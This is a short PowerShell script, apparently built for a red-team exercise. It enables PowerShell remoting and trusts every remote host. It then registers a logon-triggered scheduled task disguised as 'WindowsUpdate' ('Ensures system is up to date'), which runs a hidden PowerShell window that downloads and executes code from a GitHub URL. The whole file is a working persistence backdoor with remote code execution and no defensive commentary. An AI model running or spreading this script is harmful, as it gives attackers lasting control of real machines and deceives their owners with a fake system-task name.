Enable-PSRemoting -Force
Set-Item wsman: localhostClientTrustedHosts -Value *

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "& {IEX ((New-Object Net.WebClient).DownloadString(''https://github.com/abraccia/CDT-Alpha/tree/redteam''))}"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "Ensures system is up to date" 
